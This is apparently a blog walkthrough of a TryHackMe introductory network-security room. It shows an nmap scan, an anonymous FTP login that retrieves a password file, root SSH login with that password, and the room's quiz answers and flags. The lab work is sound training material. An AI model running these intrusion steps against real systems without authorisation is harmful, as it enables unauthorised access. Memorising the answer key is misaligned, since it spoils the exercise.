---
title:  Network Security 
author: CYB3RM3
name: CYB3RM3 | Network Security 
date: 2022-05-03 21:42:57 +0100
categories: [TryHackMe, Introduction to Cyber Security]
tags: [Red Team, Network]
---

Learn about network security, understand attack methodology, and practice hacking into a target server.

THM Room [https://tryhackme.com/room/intronetworksecurity](https://tryhackme.com/room/intronetworksecurity)


## TASK 1 : Introduction
### What type of firewall is Windows Defender Firewall?
"Host firewall: Unlike the firewall appliance, a hardware device, a host firewall is a program that ships as part of your system, or it is a program that you install on your system. For instance, MS Windows includes Windows Defender Firewall, and Apple macOS includes an application firewall; both are host firewalls."

Answer : host firewall

## TASK 2 : Methodology 
### During which step of the Cyber Kill Chain does the attacker gather information about the target? 
Answer : recon

## TASK 3 : Practical Example of Network Security 
###  What is the password in the secret.txt file?

Sanned the target IP with nmap :

```console
root@ip-10-10-141-49:~# nmap 10.10.244.107

Starting Nmap 7.60 ( https://nmap.org ) at 2022-05-03 20:37 BST
Nmap scan report for ip-10-10-244-107.eu-west-1.compute.internal (10.10.244.107)
Host is up (0.0030s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:B7:A6:3A:45:FD (Unknown)
```
{: .nolineno }

Then tried to log to the FTP with anonymous. I found a secret.txt file with a password :

```console
root@ip-10-10-141-49:~# ftp 10.10.244.107
Connected to 10.10.244.107.
220 (vsFTPd 3.0.3)
Name (10.10.244.107:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp        425351 Apr 06 11:22 2680-0.txt
-rw-r--r--    1 ftp      ftp           356 Apr 06 11:22 2680.epub
-rw-r--r--    1 ftp      ftp        251857 Apr 06 11:22 55317-0.txt
-rw-r--r--    1 ftp      ftp           358 Apr 06 11:22 55317.epub
-rwxr-xr-x    1 ftp      ftp           214 Apr 06 11:22 backup.sh
-rw-r--r--    1 ftp      ftp            23 Apr 06 11:22 secret.txt
226 Directory send OK.
ftp> get secret.txt
local: secret.txt remote: secret.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for secret.txt (23 bytes).
226 Transfer complete.
23 bytes received in 0.00 secs (35.0405 kB/s)
ftp> 
```
{: .nolineno }

 In another terminal :

```console
root@ip-10-10-141-49:~# cat secret.txt 
password: ABC789xyz123
```
{: .nolineno }

Answer : ABC789xyz123

### What is the content of the flag.txt in the /root directory?

Connect via SSH with previously found password :

```console
root@ip-10-10-141-49:~# ssh root@10.10.244.107
The authenticity of host '10.10.244.107 (10.10.244.107)' can't be established.
ECDSA key fingerprint is SHA256:IFP+sTfHTDm72Ta2zfK9XjKASr30+ya4ic/ApEIziio.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.244.107' (ECDSA) to the list of known hosts.
root@10.10.244.107's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue  3 May 19:38:54 UTC 2022

  System load:  0.15              Processes:             120
  Usage of /:   66.2% of 6.53GB   Users logged in:       0
  Memory usage: 25%               IPv4 address for eth0: 10.10.244.107
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Apr  7 07:53:28 2022 from 10.20.30.1
root@beginner-net-sec:~# ls
flag.txt  snap
root@beginner-net-sec:~# cat flag.txt 
THM{FTP_SERVER_OWNED}
root@beginner-net-sec:~# 
```
{: .nolineno }

Answer : THM{FTP_SERVER_OWNED}

### What is the content of the flag.txt in the /home/librarian directory?

Looking in the other user directory :

```console
root@beginner-net-sec:~# cd /home/librarian/
root@beginner-net-sec:/home/librarian# ls
flag.txt
root@beginner-net-sec:/home/librarian# cat flag.txt 
THM{LIBRARIAN_ACCOUNT_COMPROMISED}
```
{: .nolineno }

Answer : THM{LIBRARIAN_ACCOUNT_COMPROMISED}